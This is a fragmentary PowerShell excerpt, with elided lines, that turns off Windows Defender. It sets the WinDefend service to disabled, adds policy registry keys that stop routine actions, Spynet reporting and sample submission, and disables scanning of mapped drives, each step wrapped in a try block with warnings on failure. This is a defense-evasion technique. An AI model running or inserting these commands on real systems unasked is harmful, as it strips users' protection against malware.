...
#attempt to disable window defender 
try{
  ...
  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
      ...
      Write-Warning "Failed to disable the Windefend service"}
try{
...
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
   ...
   New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender\Spynet" -Name "SpynetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null


   New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsDefender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
...
Set-MpPreference -DisableScanningMappedNetworkDriversForFullScan $true -Force -ea 0 | Out-Null
...
Write-Warning "Failed to disable the Windows Defender"
}
